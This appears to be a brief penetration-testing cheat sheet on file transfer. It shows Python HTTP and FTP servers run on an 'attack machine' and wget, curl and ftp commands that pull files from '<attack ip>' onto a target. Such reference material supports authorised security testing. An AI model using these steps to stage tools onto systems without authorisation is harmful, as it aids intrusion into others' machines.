-- -
## Servers
-- -
#### HTTP
```bash
# on attack machine
sudo python -m http.server 80
python -m SimpleHTTPServer 80
```
#### FTP
```bash
python -m pyftpdlib 21
```
## Download
-- -
#### HTTP
```bash
# you can also open a browser using the attack ip and download from there.
wget http://<attack ip>
curl http://<attack ip> -o <filename> 
```
#### FTP
```bash
ftp <attack ip>
get <file>
```